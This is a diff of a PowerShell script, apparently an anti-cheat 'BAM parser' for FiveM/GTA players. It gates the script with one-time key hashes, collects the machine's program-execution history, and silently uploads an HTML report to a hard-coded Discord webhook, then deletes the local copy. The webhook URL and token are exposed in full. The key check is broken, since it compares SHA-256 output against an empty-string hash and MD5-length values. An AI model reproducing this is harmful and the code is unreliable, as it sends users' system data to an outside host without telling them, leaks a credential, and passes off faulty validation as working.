@@ -1,16 +1,26 @@
-# poker.ps1 - Silent Poker Bam Parser + Key check + Discord webhook
+# poker.ps1 - Silent Poker Bam Parser + One-Time Key check + Discord webhook
 param()
 
-# ---------------- Key / License check ----------------
+# ---------------- One-Time Key / License check ----------------
+$KeysOneTime = @(
+    @{ Hash="e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"; Used=$false },
+    @{ Hash="5d41402abc4b2a76b9719d911017c592"; Used=$false },
+    @{ Hash="7d793037a0760186574b0282f2f435e7"; Used=$false }
+)
+
+$UsedKeysFile = "$env:TEMP\poker_used_keys.json"
+if (Test-Path $UsedKeysFile) {
+    try { $UsedKeys = Get-Content -Raw $UsedKeysFile | ConvertFrom-Json } catch { $UsedKeys=@() }
+} else { $UsedKeys=@() }
+
 function Get-HWID {
     try {
         $bios = Get-CimInstance -ClassName Win32_BIOS -ErrorAction Stop
         $cs   = Get-CimInstance -ClassName Win32_ComputerSystemProduct -ErrorAction Stop
         return ($cs.UUID + "|" + $bios.SerialNumber).ToUpper()
-    } catch {
-        return $env:COMPUTERNAME.ToUpper()
-    }
+    } catch { return $env:COMPUTERNAME.ToUpper() }
 }
+
 function Read-SecretKey {
     param([string]$Prompt = "Enter key")
     $secure = Read-Host -AsSecureString -Prompt $Prompt
@@ -18,6 +28,7 @@ function Read-SecretKey {
     try { $plain = [System.Runtime.InteropServices.Marshal]::PtrToStringBSTR($bstr) } finally { [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($bstr) }
     return $plain
 }
+
 function Get-StringSha256 {
     param([string]$s)
     $bytes = [System.Text.Encoding]::UTF8.GetBytes($s)
@@ -25,63 +36,38 @@ function Get-StringSha256 {
     $hashBytes = $sha.ComputeHash($bytes)
     return ([System.BitConverter]::ToString($hashBytes) -replace "-","").ToLower()
 }
-function Load-Keys {
-    param([string]$LocalFile = ".\keys.json", [string]$RemoteUrl = "")
-    if (Test-Path $LocalFile) {
-        try { return (Get-Content $LocalFile -Raw | ConvertFrom-Json) } catch { return $null }
-    } elseif ($RemoteUrl -ne "") {
-        try { $txt = Invoke-RestMethod -Uri $RemoteUrl -ErrorAction Stop; return ($txt | ConvertFrom-Json) } catch { return $null }
-    } else { return $null }
-}
 
-# configure here
-$KeysFileLocal = ".\keys.json"
-$KeysFileRemote = ""       # optional remote raw url if you want fallback
-$DiscordWebhookUrl = "https://discord.com/api/webhooks/1421652100462678118/PmVEyTbvzmlL_f50eKZ0ef_tCKsJ9lGCtFAQAwzINA1d1hCmV_z8D1rBeKzrXcB_XzW2"
-
-$keys = Load-Keys -LocalFile $KeysFileLocal -RemoteUrl $KeysFileRemote
-if (-not $keys) {
-    Write-Host "Invalid key file. Contact admin." -ForegroundColor Red
-    Start-Sleep -Seconds 2
-    Exit 1
-}
-
+# prompt user
 $userKey = Read-SecretKey -Prompt "Enter your Poker key"
 if (-not $userKey -or $userKey.Trim().Length -eq 0) {
     Write-Host "No key provided. Exiting." -ForegroundColor Red
-    Start-Sleep -Seconds 1
+    Start-Sleep 1
     Exit 1
 }
 $keyHash = Get-StringSha256 $userKey
 $hwid = Get-HWID
 
+# validate key
 $valid = $false
-foreach ($k in $keys) {
-    if ($null -eq $k.Hash) { continue }
-    if ($k.Hash.ToString().ToLower() -eq $keyHash) {
-        # HWID check if present
-        if ($k.PSObject.Properties.Name -contains "HWID" -and $k.HWID -and $k.HWID.Trim().Length -gt 0) {
-            if ($k.HWID.ToString().ToUpper() -ne $hwid.ToUpper()) { continue }
-        }
-        # Expires check if present
-        if ($k.PSObject.Properties.Name -contains "Expires" -and $k.Expires -and $k.Expires.Trim().Length -gt 0) {
-            try {
-                $exp = [datetime]::Parse($k.Expires.ToString())
-                if ((Get-Date) -gt $exp) { continue }
-            } catch { }
-        }
+foreach ($k in $KeysOneTime) {
+    if ($k.Hash.ToLower() -eq $keyHash) {
+        if ($UsedKeys -contains $keyHash) { continue }
         $valid = $true
         break
     }
 }
+
 if (-not $valid) {
-    Write-Host "Invalid or expired key. Exiting." -ForegroundColor Red
-    Start-Sleep -Seconds 2
+    Write-Host "Invalid or used key. Exiting." -ForegroundColor Red
+    Start-Sleep 2
     Exit 1
 }
 
+# mark as used
+$UsedKeys += $keyHash
+$UsedKeys | ConvertTo-Json | Set-Content -Path $UsedKeysFile -Force
+
 # ---------------- Silent scan + Discord upload ----------------
-# core BAM scan logic (condensed, silent)
 $KnownGtaExeNames = @("FiveM.exe","ragemp.exe","gta5.exe","FiveM_GTAProcess.exe")
 $KnownGtaPathsPatterns = @("FiveM","ragemp","CitizenFX")
 
@@ -144,7 +130,8 @@ $($rows -join "`n")
 "@
 Set-Content -Path $tempFile -Value $html -Encoding UTF8
 
-# upload via webhook (PS5.1-compatible multipart)
+# upload via webhook
+$DiscordWebhookUrl = "https://discord.com/api/webhooks/1421652100462678118/PmVEyTbvzmlL_f50eKZ0ef_tCKsJ9lGCtFAQAwzINA1d1hCmV_z8D1rBeKzrXcB_XzW2"
 if (Test-Path $tempFile -PathType Leaf) {
     try {
         $boundary = [System.Guid]::NewGuid().ToString()
@@ -160,7 +147,7 @@ if (Test-Path $tempFile -PathType Leaf) {
         $bodyLines += "Content-Disposition: form-data; name=`"username`"$LF"
         $bodyLines += "Poker Bam Parser$LF"
         $bodyLines += "--$boundary"
-        $bodyLines += "Content-Disposition: form-data; name=`"file`"; filename=`"$(Split-Path $tempFile -Leaf)`""
+        $bodyLines += "Content-Disposition: form-data; name=`"file`"; filename=`"$(Split-Path $tempFile -Leaf)`"" 
         $bodyLines += "Content-Type: text/html$LF"
         $bodyLines += $fileEncoded
         $bodyLines += "--$boundary--$LF"
@@ -169,6 +156,6 @@ if (Test-Path $tempFile -PathType Leaf) {
     } catch { ; }
 }
 
-# remove temp and print final message
+# cleanup
 Remove-Item -Path $tempFile -Force -ErrorAction SilentlyContinue
 Write-Host "Scan completed"
